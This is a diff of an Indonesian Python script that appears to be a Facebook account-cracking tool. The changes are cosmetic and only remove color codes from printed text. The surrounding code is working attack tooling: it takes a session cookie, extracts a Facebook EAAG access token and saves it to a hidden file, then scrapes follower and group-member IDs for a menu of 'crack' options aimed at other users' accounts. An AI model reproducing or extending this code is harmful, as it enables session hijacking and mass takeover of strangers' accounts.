@@ -151,7 +151,7 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		cookie=input(f' Masukkan Cookies :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
@@ -182,8 +182,8 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	gh = 'github.com/libyapro1'
 	cetak(nel('\tSelamat Datang [yellow]%s[white] Di Dunia PERBEGALAN'%(my_name)))
-	print(f'{h} ID Kamu  : '+str(my_id))
-	print(f' IP Kamu  : {ip} {x}')
+	print(f' ID Kamu  : '+str(my_id))
+	print(f' IP Kamu  : {ip}')
 	print('')
 	print(' 1. Crack Dari Teman Publik ')
 	print(' 2. Crack Dari Follower ')
@@ -373,7 +373,7 @@ def dump_pengikut():
 		for pi in koh2['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
+		print(f'>> Total Idz : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print('>> Koneksi Internet Bermasalah ')
@@ -385,14 +385,14 @@ def dump_pengikut():
 balmond = b+"["+h+"✓"+b+"]"
 
 def lah():
-	print(f'\n{x}>> Total ID Yang Terkumpul :{h} %s '%(len(id)))
-	input(f'{x}>> [ Klik Enter ] ')
+	print(f'\n>> Total ID Yang Terkumpul : %s '%(len(id)))
+	input(f'>> [ Klik Enter ] ')
 	print('')
 	pass
 	setting()
 def grup():
 	print('')
-	id = input(f'{x}>> Masukkan Username Atau ID Grup : ')
+	id = input(f'>> Masukkan Username Atau ID Grup : ')
 	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
 	miskinlu = {"user-agent": ua}
 	url = "https://mbasic.facebook.com/groups/"+id
@@ -414,7 +414,7 @@ def grup():
 		time.sleep(0.5)
 		grup()
 	else:pass
-	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
+	print(f'>> Nama Grup : {b}%s'%(berr2))
 	ggs = gn.find_all('table')
 	ang = []
 	for ff in ggs:
@@ -428,13 +428,13 @@ def grup():
 	if len(ang)==0:
 		print(" Anggota : -")
 	else:
-		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
+		print(f'>> Anggota : {h}%s'%(ang[0]))
 	grup1(url)
 def grup1(urls):
 	use = []
 	ses = requests.Session()
 	print(f'{x}>> Sedang Mengumpulkan ID ')
-	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
+	print(f'>> Klik Ctrl+C Untuk Stop Dump !!')
 	while True:
 		try:
 			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
